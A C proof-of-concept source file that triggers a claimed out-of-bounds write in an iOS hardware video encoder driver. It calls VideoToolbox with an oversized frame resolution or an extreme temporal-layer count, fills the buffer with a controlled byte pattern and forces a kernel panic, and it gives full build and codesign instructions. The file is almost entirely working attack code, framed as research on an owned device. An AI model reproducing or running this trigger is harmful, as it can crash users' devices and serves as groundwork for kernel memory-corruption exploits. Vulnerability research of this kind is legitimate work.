/*
 * ave_oob_trigger.c — CVE-2026-112705 AVEVideoEncoder OOB Write Probe
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Educational research on owned device
 *
 * Two trigger paths:
 *   1. Resolution overflow: 32768x16384 BGRA (dart-ave PTE fault)
 *   2. Temporal layer count: NumberOfTemporalLayers=16463 (kernel data abort)
 *
 * The OOB write goes through the AVE coprocessor's DMA engine (DART),
 * which bypasses MIE tag checks (CPU load/store only).
 *
 * This is a PROBE — it will cause a kernel panic on vulnerable devices.
 * Run only on a device you own with a fresh backup.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -o ave_oob_trigger ave_oob_trigger.c
 *
 *   codesign -f -s - --entitlements ent.plist ave_oob_trigger
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef enum {
    MODE_GUARD,
    MODE_RESOLUTION,
    MODE_TEMPORAL,
    MODE_INFO
} probe_mode_t;

static void print_usage(const char *prog) {
    fprintf(stderr, "Usage: %s [guard|resolution|temporal|info]\n", prog);
    fprintf(stderr, "  guard      — safe 16384x16384 encode (should not crash)\n");
    fprintf(stderr, "  resolution — 32768x16384 encode (dart-ave PTE fault)\n");
    fprintf(stderr, "  temporal   — NumberOfTemporalLayers=16463 (kernel data abort)\n");
    fprintf(stderr, "  info       — print device info without triggering anything\n");
}

static int probe_encode(int width, int height, int temporal_layers) {
    printf("[*] Creating VTCompressionSession: %dx%d H.264\n", width, height);

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault,
        width,
        height,
        kCMVideoCodecType_H264,
        NULL,   /* encoderSpecification */
        NULL,   /* imageBufferAttributes — nil = BGRA/no-IOSurface path */
        NULL,   /* compressedDataAllocator */
        NULL,   /* outputCallback */
        NULL,   /* refcon */
        &session
    );

    if (status != noErr || !session) {
        printf("[-] VTCompressionSessionCreate failed: %d\n", (int)status);
        return -1;
    }
    printf("[+] Session created successfully\n");

    /* Set real-time encoding */
    VTSessionSetProperty(session,
        kVTCompressionPropertyKey_RealTime,
        kCFBooleanTrue);

    /* Set temporal layers if requested */
    if (temporal_layers > 0) {
        printf("[*] Setting NumberOfTemporalLayers = %d\n", temporal_layers);
        CFNumberRef layerCount = CFNumberCreate(
            kCFAllocatorDefault,
            kCFNumberIntType,
            &temporal_layers
        );
        /* kVTCompressionPropertyKey_BaseLayerFrameRateFraction may also be needed */
        CFStringRef key = CFSTR("NumberOfTemporalLayers");
        status = VTSessionSetProperty(session, key, layerCount);
        CFRelease(layerCount);
        if (status != noErr) {
            printf("[!] SetProperty NumberOfTemporalLayers returned: %d\n", (int)status);
            /* Continue anyway — some builds accept, some reject */
        } else {
            printf("[+] NumberOfTemporalLayers set successfully\n");
        }
    }

    /* Prepare to encode */
    printf("[*] Preparing to encode frames...\n");
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        printf("[-] PrepareToEncodeFrames failed: %d\n", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }
    printf("[+] Session prepared\n");

    /* Create pixel buffer */
    printf("[*] Creating CVPixelBuffer: %dx%d BGRA\n", width, height);
    CVPixelBufferRef pixelBuffer = NULL;
    CVReturn cvStatus = CVPixelBufferCreate(
        kCFAllocatorDefault,
        width,
        height,
        kCVPixelFormatType_32BGRA,
        NULL,   /* no IOSurface attributes */
        &pixelBuffer
    );

    if (cvStatus != kCVReturnSuccess || !pixelBuffer) {
        printf("[-] CVPixelBufferCreate failed: %d\n", (int)cvStatus);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }
    printf("[+] PixelBuffer created: %zu bytes\n",
        CVPixelBufferGetDataSize(pixelBuffer));

    /* Fill with controlled pattern */
    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
    void *base = CVPixelBufferGetBaseAddress(pixelBuffer);
    if (base) {
        size_t dataSize = CVPixelBufferGetDataSize(pixelBuffer);
        printf("[*] Filling %zu bytes with pattern 0x41414141...\n", dataSize);
        memset(base, 0x41, dataSize);
    }
    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);

    /* Submit frame — THIS IS THE TRIGGER POINT */
    printf("[!] Submitting frame — if vulnerable, kernel will panic\n");
    printf("[!] Panic signature: dart-ave PTE-invalid write fault\n");
    fflush(stdout);
    sleep(1);

    VTEncodeInfoFlags flags = 0;
    CMTime pts = CMTimeMake(0, 30);
    CMTime dur = CMTimeMake(1, 30);

    status = VTCompressionSessionEncodeFrame(
        session,
        pixelBuffer,
        pts,
        dur,
        NULL,   /* frameProperties */
        NULL,   /* sourceFrameRefcon */
        &flags
    );

    /* If we reach here, the bug is patched or the device is not vulnerable */
    printf("[+] EncodeFrame returned: %d (flags=0x%x)\n", (int)status, (unsigned)flags);
    if (status == noErr) {
        printf("[*] No crash — bug may be patched on this build\n");
    } else {
        printf("[*] Error returned — driver rejected the input\n");
    }

    /* Cleanup */
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pixelBuffer);

    return (int)status;
}

static void print_info(void) {
    printf("=== AVE OOB Trigger — Device Info ===\n");
    printf("PID: %d\n", getpid());

    /* Try to read hw.machine */
    char machine[64] = {0};
    size_t len = sizeof(machine);
    if (sysctlbyname("hw.machine", machine, &len, NULL, 0) == 0) {
        printf("hw.machine: %s\n", machine);
    }

    char model[64] = {0};
    len = sizeof(model);
    if (sysctlbyname("hw.model", model, &len, NULL, 0) == 0) {
        printf("hw.model: %s\n", model);
    }

    char osversion[64] = {0};
    len = sizeof(osversion);
    if (sysctlbyname("kern.osversion", osversion, &len, NULL, 0) == 0) {
        printf("kern.osversion: %s\n", osversion);
    }

    char osrelease[64] = {0};
    len = sizeof(osrelease);
    if (sysctlbyname("kern.osrelease", osrelease, &len, NULL, 0) == 0) {
        printf("kern.osrelease: %s\n", osrelease);
    }

    printf("=====================================\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    probe_mode_t mode;
    if (strcmp(argv[1], "guard") == 0) {
        mode = MODE_GUARD;
    } else if (strcmp(argv[1], "resolution") == 0) {
        mode = MODE_RESOLUTION;
    } else if (strcmp(argv[1], "temporal") == 0) {
        mode = MODE_TEMPORAL;
    } else if (strcmp(argv[1], "info") == 0) {
        mode = MODE_INFO;
    } else {
        print_usage(argv[0]);
        return 1;
    }

    printf("=== CVE-2026-112705 AVEVideoEncoder OOB Probe ===\n");
    printf("Target: iPhone Duo (A20 Pro), iOS 27.1\n");
    printf("Mode: %s\n\n", argv[1]);

    print_info();
    printf("\n");

    switch (mode) {
    case MODE_INFO:
        printf("[*] Info mode — no encode attempted\n");
        return 0;

    case MODE_GUARD:
        printf("[*] Guard mode — 16384x16384 (should be safe)\n");
        return probe_encode(16384, 16384, 0);

    case MODE_RESOLUTION:
        printf("[!] Resolution trigger — 32768x16384\n");
        printf("[!] WARNING: This WILL kernel panic on vulnerable devices\n");
        printf("[!] Press Ctrl+C within 3 seconds to abort...\n");
        sleep(3);
        return probe_encode(32768, 16384, 0);

    case MODE_TEMPORAL:
        printf("[!] Temporal layer trigger — NumberOfTemporalLayers=16463\n");
        printf("[!] WARNING: This WILL kernel panic on vulnerable devices\n");
        printf("[!] Press Ctrl+C within 3 seconds to abort...\n");
        sleep(3);
        return probe_encode(1920, 1080, 16463);
    }

    return 0;
}
